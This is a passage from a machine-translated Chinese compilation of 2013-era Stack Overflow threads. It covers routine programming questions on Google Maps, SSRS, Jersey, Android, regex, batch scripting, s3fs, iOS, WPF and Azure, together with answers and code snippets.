我发现这个例子非常方便 [http://google-maps-utility-library-v3.googlecode.com/svn/trunk/infobubble/examples/example.html][1]，试试下面的代码片段。

```
var map, infoBubble;
      function init() {
        var mapCenter = new google.maps.LatLng(-35.397, 150.644);
        map = new google.maps.Map(document.getElementById('map'), {
          zoom: 8,
          center: mapCenter,
          mapTypeId: google.maps.MapTypeId.ROADMAP
        });

        var marker = new google.maps.Marker({
          map: map,
          position: new google.maps.LatLng(-35, 150),
          draggable: true
        });

        infoBubble = new InfoBubble({
          maxWidth: 300
        });

        infoBubble.open(map, marker);

        infoBubble.setContent('This is a sample content') //Please set your content here.

        google.maps.event.addListener(marker, 'click', function() {
          if (!infoBubble.isOpen()) {
            infoBubble.open(map, marker);
          }
          });

      }
      google.maps.event.addDomListener(window, 'load', init);
}

  [1]: http://google-maps-utility-library-v3.googlecode.com/svn/trunk/infobubble/examples/example.html 
```

# ssrs-2008 - 在 SSRS 中，是否可以在不使用 C# 的情况下从主 rdl 循环一个子报表 rdl？

> ID：15111131
> 
> 赞同：1
> 
> 时间：2013-02-27T11:38:14.817
> 
> 标签：ssrs-2008, reporting-services

我在使用母版页中的子报表时遇到问题。我的母版页有 4 个参数，其中一个参数会有所不同。

母版页内的一个子报表将采用 3 个不变的参数，而第 4 个参数将通过循环进行更改。输出将创建从 4 参数生成的许多报告。

您如何从母版页创建一个循环，更改第 4 个参数的值以运行子报表的次数与第 4 个参数中的值一样多？

主报告 (Main.rdl) 参数 WidgetID RegionID TimePeriodID

查询将获得不同的 StateID

SubReport (subreport.rdl) 参数 WidgetID RegionID TimePeriodID StateID

该报告有 5 行标题，其中包含标题中的所有参数，包括第一个状态名称。详细信息行包含该状态内的所有小部件信息。

然后循环获取下一个 StateID 并像以前一样重复输出。

然后继续，直到所有的 StateID 都是进程。

我不能按州分组，因为那必须在标题中。

听从多米尼克的建议，我试着按照他的指示去做。

**主文件**

通过工具箱创建了一个表格并将子报表放在第一个数据列中。

添加了 3 个参数

数据集输出

**子报表.rdl**

添加了 3 个参数

数据集输出

当我预览 Main1.rdl 时，我得到第一行，然后是新页面。第二行，然后是新页面。

我想要得到的是州代码更改后的新页面。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-11T11:24:09.250

I have had the same problem and I've had some trouble with creating the right dataset because I've been working with MDX to access my cube. If you use SQL, this isn't relevant, but I'm adding this because a lot of gents use MDX. What I eventually did:

-Let my parameter and its dataset get generated automatically (MDX) -Make my tablix to put my subreport in -Link this tablix to the parameter's dataset -Put a filter on the tablix: - ParameterValue "IN" "=Parameters!parameterName.Value"

Be sure to -use "IN" and not "=" -use "=Parameters!SLASLANAME.Value" and not "=Parameters!SLASLANAME.Value**(0)**" in your expression

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T14:15:26.587

您必须创建一个数据集，该数据集将根据您的参数返回行，然后将您的子报表包含在绑定到该数据集的表中。

# json - 返回 JSON 中的 Jersey 异常

> ID：15111134
> 
> 赞同：6
> 
> 时间：2013-02-27T11:38:25.230
> 
> 标签：json, jersey

以 JSON 格式返回 Jersey 异常的最佳方法是什么？这是我的示例代码。

```
 public static class CompoThngExceptionMapper implements ExceptionMapper<Exception> {
    @Override
    public Response toResponse(Exception exception) {
        if (exception instanceof WebApplicationException) {
            WebApplicationException e = (WebApplicationException) exception;
            Response r = e.getResponse();
            return Response.status(r.getStatus()).entity(**HERE JSON**).build();
    } else {
            return null;

        }
    } 
```

提前致谢！！！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-27T16:11:54.500

取决于你想返回什么，但我个人有一个`ErrorInfo`看起来像这样的对象：

```
public class ErrorInfo {
    final transient String developerMessage;
    final transient String userMessage;

    // Getters/setters/initializer
} 
```

我将它作为我`Exception`的 s 的一部分传递，然后我只使用 Jackson 's`ObjectMapper`从 . 这种方法的好处是您可以非常轻松地对其进行扩展，因此添加状态信息、错误时间等只是添加另一个字段的情况。`ErrorInfo``ExceptionMapper`

请记住，添加响应状态之类的内容有点浪费，因为无论如何它都会在 HTTP 标头中返回。

**更新**

一个完整的例子如下（在这种情况下 ErrorInfo 有更多的字段，但你明白了一般的想法）：

```
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import javax.ws.rs.core.Response.ResponseBuilder;
import javax.ws.rs.core.Response.Status;
import javax.ws.rs.ext.ExceptionMapper;
import javax.ws.rs.ext.Provider;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

@Provider
public class UnexpectedExceptionMapper implements ExceptionMapper<Exception>
{
  private static final transient ObjectMapper MAPPER = new ObjectMapper(); 

  @Override
  public Response toResponse(final Exception exception)
  {
    ResponseBuilder builder = Response.status(Status.BAD_REQUEST)
                                      .entity(defaultJSON(exception))
                                      .type(MediaType.APPLICATION_JSON);
    return builder.build();
  }

  private String defaultJSON(final Exception exception)
  {
    ErrorInfo errorInfo = new ErrorInfo(null, exception.getMessage(), exception.getMessage(), (String)null);

    try
    {
      return MAPPER.writeValueAsString(errorInfo);
    }
    catch (JsonProcessingException e)
    {
      return "{\"message\":\"An internal error occurred\"}";
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2014-12-09T13:05:36.127

避免导入 Jackson 类但只坚持纯 JAX-RS 类我创建这样的 json 异常包装器。

创建 ExceptionInfo 包装器并子类化各种异常状态类型。

```
import javax.xml.bind.annotation.XmlAccessType;
import javax.xml.bind.annotation.XmlAccessorType;
import javax.xml.bind.annotation.XmlElement;
import javax.xml.bind.annotation.XmlRootElement;

@XmlAccessorType(XmlAccessType.PUBLIC_MEMBER)
@XmlRootElement
public class ExceptionInfo {
    private int status;
    private String msg, desc;
    public ExceptionInfo(int status, String msg, String desc) {
        this.status=status;
        this.msg=msg;
        this.desc=desc;
    }

    @XmlElement public int getStatus() { return status; }
    @XmlElement public String getMessage() { return msg; }
    @XmlElement public String getDescription() { return desc; }
}

- - - - 

import javax.ws.rs.core.Response;
import javax.ws.rs.core.Response.Status;
import javax.ws.rs.WebApplicationException;

/**
 * Create 404 NOT FOUND exception
 */
public class NotFoundException extends WebApplicationException {
    private static final long serialVersionUID = 1L;

    public NotFoundException() {
        this("Resource not found", null);
    }

    /**
     * Create a HTTP 404 (Not Found) exception.
     * @param message the String that is the entity of the 404 response.
     */
    public NotFoundException(String msg, String desc) {
        super(Response.status(Status.NOT_FOUND).entity(
                new ExceptionInfo(Status.NOT_FOUND.getStatusCode(), msg, desc)
        ).type("application/json").build());
    }

} 
```

然后在资源实现中抛出异常，客户端会收到一个漂亮的 json 格式的 http 错误正文。

```
@Path("/properties")
public class PropertyService {
    ...
    @GET @Path("/{key}")
    @Produces({"application/json;charset=UTF-8"})
    public Property getProperty(@PathParam("key") String key) {
        // 200=OK(json obj), 404=NotFound
        Property bean = DBUtil.getProperty(key);
        if (bean==null) throw new NotFoundException();
        return bean;
    }   
    ...
}

- - - - 
Content-Type: application/json
{"status":404,"message":"Resource not found","description":null} 
```

# reporting-services - Mozilla 中报表查看器控件中的参数被禁用

> ID：15111139
> 
> 赞同：1
> 
> 时间：2013-02-27T11:38:44.980
> 
> 标签：reporting-services, reportviewer, mozilla

生无可恋。

我有可以从报表服务器调用报表的 Web 应用程序。在一份报告中，有六个参数，其中最后两个是日期时间参数。一些参数依赖于其他参数，但日期时间不是。

当我在我的机器上启动这个应用程序时，一切都很好。

在客户端，有 4 台机器，其中一台与其他三台是分开的。在那台单独的机器上也一切正常，但在其他三台机器上我有奇怪的问题。

顺便说一句，当我从报告列表运行报告时，我得到了报告查看器控件，其中有六个参数。其中一些是自动填充的，比如说前三个，第四个是多项选择，当我选中该列表中的一项时，最后两个参数需要启用。但即使在列表中选择项目后，日期时间参数也会被禁用。

顺便说一句，我部署了相同的报告，其中 datetime 参数放置在第一个和第二个，运行时，它们被启用，但现在最后两个再次被禁用。

更糟糕的是，这仅发生在一个用户一台所有三台机器上，其他用户正常生成报告。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T12:14:47.057

好的，您可以尝试清除有问题的客户端计算机上的浏览历史记录。然后尝试访问报告。它应该有助于解决您的问题。

# android - 我可以使用广播接收器启动另一个应用程序吗？

> ID：15111140
> 
> 赞同：1
> 
> 时间：2013-02-27T11:38:45.933
> 
> 标签：android, android-broadcast

我只是想知道我已经创建了一个应用程序并将其安装在我的设备上。是否可以仅使用广播接收器来启动此应用程序，如果可以，我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:49:08.133

在您的应用程序未运行时使用以下代码打开活动。

```
Intent myIntent = new Intent(context.getApplicationContext(), YourClassActivity.class);
Bundle bundle = new Bundle();
myIntent.putExtras(bundle);
myIntent.addFlags(
      Intent.FLAG_ACTIVITY_NEW_TASK
    | Intent.FLAG_ACTIVITY_CLEAR_TOP
    | Intent.FLAG_ACTIVITY_SINGLE_TOP);
context.getApplicationContext().startActivity(myIntent); 
```

您可以在捆绑包中传递任何数据，例如

```
bundle.putString("title", "from receiver"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:43:12.713

如果 BroadcastReceiver 正在监听，那么应用程序也在“运行”。如果你的意思是打开Activity，那么

```
@Override
public void onReceive(Context context, Intent intent) {
    context.startActivity(new Intent(context, YourActivity.class));
} 
```

您需要在清单中静态注册接收器（来自 doc）

`You can either dynamically register an instance of this class with Context.registerReceiver() or statically publish an implementation through the <receiver> tag in your AndroidManifest.xml.` 您还应该指定您无法捕获的意图操作

```
<receiver android:name=".YourReceiver"
    android:exported="true"
    android:enabled="true" >
    <intent-filter>
       <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
    </intent-filter>
</receiver> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-06-04T15:48:01.097

当您发送广播时，您需要添加一个标志来启动尚未运行的包。

```
getContext().sendBroadcast(new Intent("MY_ACTION").setFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES), null); 
```

# regex - Sublime Text 正则表达式范围

> ID：15111141
> 
> 赞同：0
> 
> 时间：2013-02-27T11:38:47.320
> 
> 标签：regex, sublimetext2

`/[^0-9\.]/g`我可以在 Sublime Text 搜索和替换中使用什么相当于 JS 正则表达式？

* * *

**更新：**

我想替换`array(9.49),`为`9.49,`.

我找到了一个解决方案：

寻找：`array\((\d.+)\)(,)`

并替换：`\1\2`

无论如何，我想知道如何在 Sublime 中使用范围来使用等效于 JS 正则表达式`/[^0-9\.]/g`而不是`\d.+`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:48:40.913

您需要删除分隔符（斜杠）；无论如何，全局修饰符`g`都是隐式的，并且在任何一种情况下都不需要反斜杠：

```
[^0-9.] 
```

应该做。

**编辑：**

您编辑的问题现在似乎正在寻找完全不同的东西：

你想搜索

```
array\(([\d.]+)\),   // or array\(([0-9.]+)\), 
```

并替换为

```
\1, 
```

# batch-file - 删除双空格并用一个替换它们

> ID：15111144
> 
> 赞同：2
> 
> 时间：2013-02-27T11:38:56.070
> 
> 标签：batch-file

我需要从执行的命令中删除空格。

我`set /p`用来获取变量。

如果用户输入：

```
------what-----is---------my--------ip--------- 
```

...`------`空格在哪里，我想得到以下结果：

```
what is my ip 
```

（单词之间只有一个空格）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T14:27:27.547

你可以这样做：

```
@ECHO OFF
SET /P x=
FOR /F "tokens=*" %%i IN ('ECHO %x%') DO SET y=%%i
ECHO original input  : %x%
ECHO spaces condensed: %y% 
```

对于输入字符串

```
 What     is         my        ip 
```

这返回

```
original input  :       What     is         my        ip
spaces condensed: What is my ip 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-28T01:35:10.917

没有简单的本机批处理命令可以完全满足您的要求。Batch 在文本操作方面相当薄弱。但它可以用一小块本机批处理代码来完成。

这是一种纯批处理解决方案。代码在循环中用单个空格替换双空格，直到不再存在双空格。然后它删除任何前导和尾随空格。我选择使用延迟扩展，因为这样可以消除特殊字符等问题`&` `<` `>`。

```
@echo off
setlocal enableDelayedExpansion
set "str="
set /p "str=Enter a string: "
echo before: '!str!'

:: **** Begin space compression code ****
:loop
if defined str (
  set "new=!str:  = !"
  if "!new!" neq "!str!" (
    set "str=!new!"
    goto :loop
  )
)
if defined str if "!str:~0,1!" equ " " set "str=!str:~1!"
if defined str if "!str:~-1!" equ " " set "str=!str:~0,-1!"
:: **** End space compression code ****

echo after:  '!str!' 
```

您可以下载各种实用程序以使工作更轻松。例如，免费[的 Windows 版 Gnu sed](http://gnuwin32.sourceforge.net/packages/sed.htm)可以解决这个问题。

一些办公室不允许使用下载的可执行文件。我编写了一个名为 REPL.BAT 的混合 JScript/批处理脚本，它对文本操作非常有用。它提供方便的正则表达式搜索和替换功能，并且只使用原生 Windows 命令，不需要任何安装。所以应该可以在任何地方使用。

这是一个使用 REPL.BAT 实用程序的解决方案。它比上面的纯批处理解决方案要短得多，并且不需要延迟扩展。（我暂时启用延迟扩展只是为了可靠地回显该值）

```
@echo off
setlocal disableDelayedExpansion
set "str="
set /p "str=Enter a string: "

call :displayValue "before:" str

:: **** Begin space compression code ****
for /f "eol= tokens=* delims= " %%A in (
  'repl "  *" " " s str ^| repl " $" ""'
) do set "str=%%A"
:: **** End space compression code ****

call :displayValue "after: " str
exit /b

:displayValue
setlocal enableDelayedExpansion
echo %~1 '!%~2!'
exit /b 
```

第一个 REPL 命令读取环境变量并将连续的空格转换为单个空格。该结果通过管道传送到第二个 REPL 命令中，该命令删除任何尾随空格。最后，其输出由删除前导空格的 FOR /F 命令处理。

这是上述代码所依赖的 REPL.BAT 实用程序。完整的文档嵌入在脚本中。

```
@if (@X)==(@Y) @end /* Harmless hybrid line that begins a JScript comment

::************ Documentation ***********
:::
:::REPL  Search  Replace  [Options  [SourceVar]]
:::REPL  /?
:::
:::  Performs a global search and replace operation on each line of input from
:::  stdin and prints the result to stdout.
:::
:::  Each parameter may be optionally enclosed by double quotes. The double
:::  quotes are not considered part of the argument. The quotes are required
:::  if the parameter contains a batch token delimiter like space, tab, comma,
:::  semicolon. The quotes should also be used if the argument contains a
:::  batch special character like &, |, etc. so that the special character
:::  does not need to be escaped with ^.
:::
:::  If called with a single argument of /? then prints help documentation
:::  to stdout.
:::
:::  Search  - By default this is a case sensitive JScript (ECMA) regular
:::            expression expressed as a string.
:::
:::            JScript syntax documentation is available at
:::            http://msdn.microsoft.com/en-us/library/ae5bf541(v=vs.80).aspx
:::
:::  Replace - By default this is the string to be used as a replacement for
:::            each found search expression. Full support is provided for
:::            substituion patterns available to the JScript replace method.
:::            A $ literal can be escaped as $$. An empty replacement string
:::            must be represented as "".
:::
:::            Replace substitution pattern syntax is documented at
:::            http://msdn.microsoft.com/en-US/library/efy6s3e6(v=vs.80).aspx
:::
:::  Options - An optional string of characters used to alter the behavior
:::            of REPL. The option characters are case insensitive, and may
:::            appear in any order.
:::
:::            I - Makes the search case-insensitive.
:::
:::            L - The Search is treated as a string literal instead of a
:::                regular expression. Also, all $ found in Replace are
:::                treated as $ literals.
:::
:::            E - Search and Replace represent the name of environment
:::                variables that contain the respective values. An undefined
:::                variable is treated as an empty string.
:::
:::            M - Multi-line mode. The entire contents of stdin is read and
:::                processed in one pass instead of line by line. ^ anchors
:::                the beginning of a line and $ anchors the end of a line.
:::
:::            X - Enables extended substitution pattern syntax with support
:::                for the following escape sequences:
:::
:::                \\     -  Backslash
:::                \b     -  Backspace
:::                \f     -  Formfeed
:::                \n     -  Newline
:::                \r     -  Carriage Return
:::                \t     -  Horizontal Tab
:::                \v     -  Vertical Tab
:::                \xnn   -  Ascii (Latin 1) character expressed as 2 hex digits
:::                \unnnn -  Unicode character expressed as 4 hex digits
:::
:::                Escape sequences are supported even when the L option is used.
:::
:::            S - The source is read from an environment variable instead of
:::                from stdin. The name of the source environment variable is
:::                specified in the next argument after the option string.
:::

::************ Batch portion ***********
@echo off
if .%2 equ . (
  if "%~1" equ "/?" (
    findstr "^:::" "%~f0" | cscript //E:JScript //nologo "%~f0" "^:::" ""
    exit /b 0
  ) else (
    call :err "Insufficient arguments"
    exit /b 1
  )
)
echo(%~3|findstr /i "[^SMILEX]" >nul && (
  call :err "Invalid option(s)"
  exit /b 1
)
cscript //E:JScript //nologo "%~f0" %*
exit /b 0

:err
>&2 echo ERROR: %~1\. Use REPL /? to get help.
exit /b

************* JScript portion **********/
var env=WScript.CreateObject("WScript.Shell").Environment("Process");
var args=WScript.Arguments;
var search=args.Item(0);
var replace=args.Item(1);
var options="g";
if (args.length>2) {
  options+=args.Item(2).toLowerCase();
}
var multi=(options.indexOf("m")>=0);
var srcVar=(options.indexOf("s")>=0);
if (srcVar) {
  options=options.replace(/s/g,"");
}
if (options.indexOf("e")>=0) {
  options=options.replace(/e/g,"");
  search=env(search);
  replace=env(replace);
}
if (options.indexOf("l")>=0) {
  options=options.replace(/l/g,"");
  search=search.replace(/([.^$*+?()[{\\|])/g,"\\$1");
  replace=replace.replace(/\$/g,"$$$$");
}
if (options.indexOf("x")>=0) {
  options=options.replace(/x/g,"");
  replace=replace.replace(/\\\\/g,"\\B");
  replace=replace.replace(/\\b/g,"\b");
  replace=replace.replace(/\\f/g,"\f");
  replace=replace.replace(/\\n/g,"\n");
  replace=replace.replace(/\\r/g,"\r");
  replace=replace.replace(/\\t/g,"\t");
  replace=replace.replace(/\\v/g,"\v");
  replace=replace.replace(/\\x[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4}/g,
    function($0,$1,$2){
      return String.fromCharCode(parseInt("0x"+$0.substring(2)));
    }
  );
  replace=replace.replace(/\\B/g,"\\");
}
var search=new RegExp(search,options);

if (srcVar) {
  WScript.Stdout.Write(env(args.Item(3)).replace(search,replace));
} else {
  while (!WScript.StdIn.AtEndOfStream) {
    if (multi) {
      WScript.Stdout.Write(WScript.StdIn.ReadAll().replace(search,replace));
    } else {
      WScript.Stdout.WriteLine(WScript.StdIn.ReadLine().replace(search,replace));
    }
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-21T22:23:22.147

这就是我解决它的方式（使用延迟扩展）：

```
@ECHO OFF
setlocal enableextensions enabledelayedexpansion
SET /P str=
for /l %%i in (1,1,31) do set str=!str:  = !
ECHO spaces condensed: !str! 
```

我在一个循环中用一个替换两个连续的空格 - 假设你有 8 个空格的字符串。然后变成：

```
1        1
1    1
1  1
1 1 
```

我知道它不是通用的，但效果很好（最多 2^31 个空格）。要处理前导空格，您可以使用此技巧（可在 www.dostips.com 上找到）：

```
for /f "tokens=* delims= " %%a in ("!str!") do set str=%%a 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-10-29T00:56:55.540

我不是专家，但这是我喜欢这样做的方式：

```
@ECHO OFF
:retry
ECHO.

SET str=
SET /P str=Type text here: 
IF NOT DEFINED str GOTO retry

:: remove double spaces
:remove_double_spaces
IF NOT "%str%" == "%str:  =%" SET str=%str:  = %&& GOTO remove_double_spaces

:: retry if nothing but spaces
IF "%str%" == " " GOTO retry

:: remove leading space
IF "%str:~0,1%" == " " SET str=%str:~1%

:: remove trailing space
IF "%str:~-1%" == " " SET str=%str:~0,-1%

ECHO "%str%"
GOTO retry 
```

# android - 我可以使用我的安卓手机设置广播频道吗？

> ID：15111151
> 
> 赞同：0
> 
> 时间：2013-02-27T11:39:04.260
> 
> 标签：android, radio

我可以使用我的**Android 手机**设置无线电频道，以便接收器可以接收通过该无线电频道发送的数据。这件事在现有的 android 平台上是可能的还是允许的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:47:15.153

你至少需要一个 FM 发射器，你的手机没有这个能力，除非它是摩托罗拉。我肯定知道，较旧的（不是智能手机）型号支持 FM 传输，以便绕过网络覆盖并直接联系其他接收者，但我认为他们不会为较新的手机保留这一点。

# amazon-web-services - 使用 s3fs 时，“ls”命令不显示任何内容

> ID：15111152
> 
> 赞同：2
> 
> 时间：2013-02-27T11:39:04.450
> 
> 标签：amazon-web-services, amazon-s3, s3fs

我一直在尝试将 Amazon S3 设置为我的文件的备份服务。我想通过将它作为驱动器安装在我的 ubuntu 安装上来使用该服务，而[s3fs 项目](http://code.google.com/p/s3fs/)应该可以实现这一点。但我遇到了一些麻烦。我相信我已经成功安装了 fuse 和 s3fs。当我安装驱动器时，我没有收到任何错误；但是，当我进入目录并发出“ls”命令时，什么也没有发生。如果我使用以下命令创建测试文件：

```
touch file.test 
```

该文件显示在 aws 控制台中。但是我无法查看存储桶中已经存在的文件，也无法使用“cd”命令导航到子目录。我在项目谷歌论坛中做了一些嗅探，我想我发现 s3fs 看不到 s3 存储桶的任何内容，**除非**这些文件或目录是使用 s3fs 创建的。有没有其他人遇到过这个问题？这真的是这个项目的设计方式吗？这是一个错误吗？或者有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-27T13:14:23.070

S3FS 使用特殊的“隐藏”零字节文件来表示目录，因为 S3 并不真正支持目录。如果您在已安装的 s3fs 存储桶上尝试 mkdir，然后使用 AWS 文件浏览器，您应该会看到这一点。如果您的 S3 存储桶包含不是由 S3FS 创建的目录结构，则 S3FS 将无法识别该结构。S3FS 仅适用于仅使用 S3FS 操作的存储桶。

在尝试将 s3fs 用于我正在从事的项目后，我得出结论，最好直接暴露于 S3 的限制，而不是使用试图隐藏这些限制的东西。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-08-29T11:59:03.307

无法使用 ls 命令访问 s3：

```
ls: reading directory /mnt/s3/: Operation not permitted 
```

仅使用 s3cmd ls。

# ios - 调用[super loadView]有什么副作用

> ID：15111153
> 
> 赞同：4
> 
> 时间：2013-02-27T11:39:09.057
> 
> 标签：ios, cocoa-touch, uiview, uiviewcontroller, loadview

在 的文档中`loadView`，Apple 声明：

> 此方法的自定义实现不应调用 super。

所以我尝试调用`[super loadView]`我的`loadView`方法。似乎没有什么不好的事情发生，也没有任何警告。我正在使用以编程方式创建的视图`loadView`，而不是来自 NIB。

当我打电话时，实际上发生了什么（如果有的话）坏事`[super loadView]`？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-28T22:14:01.823

调用`[super loadView]`将导致`UIViewController`执行`loadView`运行。除此之外，这是从 NIB 加载视图的方法（如果`nibName`已提供 a）。因此，如果您最后调用 super，它可能会覆盖您在自己的子类中所做的所有视图设置。如果你先调用 super ，这不会是一个问题......除非你有任何代码`-awakeFromNib`或其他东西。

基本上，您不应该调用`super`，因为如果您以编程方式加载视图，那么在超类中完成的所有工作都不是您想要保留的工作。充其量，您正在丢掉一堆工作。在最坏的情况下，`UIViewController`可能会在那里设置一些状态，对视图的来源做出假设。

你不需要它，所以不要这样做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-28T21:54:31.383

如果你允许我做这个比较，就像“不要骑红灯过马路”。

有一个红绿灯规定了*不得*过马路，因为无论出于何种原因，这都*可能很危险。*您可能会以红色过马路而没有任何反应，这是完全合理的。

*API 通过声明您不应*调用 super来设置 is 规则。就像上面的例子一样，结果是不确定的，取决于其他事情。没有任何事情发生是完全合理的。

# wpf - WPF 我必须如何设置 DataContext

> ID：15111160
> 
> 赞同：0
> 
> 时间：2013-02-27T11:39:28.880
> 
> 标签：wpf, xaml, binding, datacontext

我有一个从列表框继承的控件。XAML 如下所示：

```
<ListBox x:Class="Bibliothek.myDockControl"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
         xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
         mc:Ignorable="d" 
         d:DesignHeight="300" d:DesignWidth="300"
         x:Name="myListBox"
         >
<ListBox.ItemContainerStyle>
    <Style TargetType="ListBoxItem">
        <Setter Property="Height" Value="{Binding ItemHeight, UpdateSourceTrigger=PropertyChanged}"/>
        <Setter Property="Template">           
            <Setter.Value>
                <ControlTemplate TargetType="ListBoxItem">
                    <Border BorderThickness="1" BorderBrush="Black" CornerRadius="2">
                        <DockPanel>
                            <StackPanel DockPanel.Dock="Top" Background="LightGray">
                                <DockPanel Margin="2,2,2,2">
                                    <TextBlock x:Name="Beschreibung" DockPanel.Dock="Left" VerticalAlignment="Center" FontWeight="Bold" Text="{Binding Header,UpdateSourceTrigger=PropertyChanged}"></TextBlock>
                                </DockPanel>
                            </StackPanel>
                            <ContentPresenter DockPanel.Dock="Top" Content="{Binding Content}"></ContentPresenter>
                        </DockPanel>
                    </Border>                                          
                </ControlTemplate>
            </Setter.Value>
        </Setter>
    </Style>
</ListBox.ItemContainerStyle> 
```

我有一个 Textblock 和 contentpresenter 的绑定。这些绑定来自我自己的类型 DockItem。看起来像这样：

```
public class DockItem
{
    public string Header { get; set; }
    public object Content { get; set; }
} 
```

绑定的这些属性是在我测试控件的窗口中设置的，并且来自绑定到列表框的 itemsource 的 typ observablecollection。

当我为上面代码中声明的 Height 属性（如 ItemHeight）添加绑定时，我不知道如何设置数据上下文。如果我在列表框控件的代码隐藏中设置 datacontext，如下所示： DataContext = this; 那么 Header 和 Content 的绑定不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T13:34:41.240

您正在尝试将两个不同的数据上下文设置为一个`ListBoxItem`。如果您确实想从父窗口中获取 ItemHeight，那么您可以这样：

```
 <Setter Property="Height" Value="{Binding ItemHeight, RelativeSource={RelativeSource FindAncestor, AncestorType=Window}}"/> 
```

不过不要忘记实现预更改通知，否则它不会对更改做出反应。或者，您可以添加`ItemHeight`到`DockItem`课程中，那么您当前的方法就可以了。

# .net - Windows Azure：无法加载文件或程序集“Microsoft.TeamFoundation.WorkItemTracking.Client.Cache”

> ID：15111162
> 
> 赞同：1
> 
> 时间：2013-02-27T11:39:36.763
> 
> 标签：.net, asp.net-mvc, azure

我正在尝试在**Windows Azure Compute 模拟器中调试****ASP MVC**应用程序，但在应用程序启动之前我收到以下错误。我的配置如下：

 ***   视窗 8 x64
*   Windows **Azure Compute 模拟器**（本地调试）
*   **IIS express**（这很重要，因为此过程会引发错误）

我已经阅读[了](https://stackoverflow.com/questions/12643654/could-not-load-file-or-assembly-microsoft-teamfoundation-workitemtracking-clien) [其他一些](http://social.msdn.microsoft.com/Forums/en-US/windowsazuredevelopment/thread/4e9ae9b6-7070-448a-862d-a7b3292e58c1/) [帖子](https://stackoverflow.com/questions/41449/i-get-a-an-attempt-was-made-to-load-a-program-with-an-incorrect-format-error-o)和其他[一些](https://stackoverflow.com/questions/12631849/assembly-is-not-compatible-with-the-64-bit-processor-architecture-used-by-iis-on)帖子，问题似乎是**x68/x64**兼容性问题。

[这篇](https://stackoverflow.com/questions/12643654/could-not-load-file-or-assembly-microsoft-teamfoundation-workitemtracking-clien)文章中的解决方案是将 IIS 配置为允许 32 位应用程序，但我不知道如何配置 IIS Express 来做到这一点。

这是详细的错误：

```
Server Error in '/' Application.
--------------------------------------------------------------------------------
 Could not load file or assembly 'Microsoft.TeamFoundation.WorkItemTracking.Client.Cache' or one of its dependencies. An attempt was made to load a program with an incorrect format. 
 Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. 
 Exception Details: System.BadImageFormatException: Could not load file or assembly 'Microsoft.TeamFoundation.WorkItemTracking.Client.Cache' or one of its dependencies. An attempt was made to load a program with an incorrect format.

Source Error: 
 An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.  
 Assembly Load Trace: The following information can be helpful to determine why the assembly 'Microsoft.TeamFoundation.WorkItemTracking.Client.Cache' could not be loaded.

=== Pre-bind state information ===
LOG: User = TITANIUM\Administrator
LOG: DisplayName = Microsoft.TeamFoundation.WorkItemTracking.Client.Cache
 (Partial)
WRN: Partial binding information was supplied for an assembly:
WRN: Assembly Name: Microsoft.TeamFoundation.WorkItemTracking.Client.Cache | Domain ID: 2
WRN: A partial bind occurs when only part of the assembly display name is provided.
WRN: This might result in the binder loading an incorrect assembly.
WRN: It is recommended to provide a fully specified textual identity for the assembly,
WRN: that consists of the simple name, version, culture, and public key token.
WRN: See whitepaper http://go.microsoft.com/fwlink/?LinkId=109270 for more information and common solutions to this issue.
LOG: Appbase = file:///C:/workspace2/01nerva/src/client/webui/Codice.Web.Client/
LOG: Initial PrivatePath = C:\workspace2\01nerva\src\client\webui\Codice.Web.Client\bin
Calling assembly : (Unknown).
===
LOG: This bind starts in default load context.
LOG: Using application configuration file: C:\workspace2\01nerva\src\client\webui\Codice.Web.Client\web.config
LOG: Using host configuration file: C:\Program Files\IIS Express\config\templates\PersonalWebServer\aspnet.config
LOG: Using machine configuration file from C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config.
LOG: Policy not being applied to reference at this time (private, custom, partial, or location-based assembly bind).
LOG: Attempting download of new URL file:///C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Temporary ASP.NET Files/root/cf250a6c/39ae37b/Microsoft.TeamFoundation.WorkItemTracking.Client.Cache.DLL.
LOG: Attempting download of new URL file:///C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Temporary ASP.NET Files/root/cf250a6c/39ae37b/Microsoft.TeamFoundation.WorkItemTracking.Client.Cache/Microsoft.TeamFoundation.WorkItemTracking.Client.Cache.DLL.
LOG: Attempting download of new URL file:///C:/workspace2/01nerva/src/client/webui/Codice.Web.Client/bin/Microsoft.TeamFoundation.WorkItemTracking.Client.Cache.DLL.
ERR: Failed to complete setup of assembly (hr = 0x8007000b). Probing terminated.

Stack Trace: 

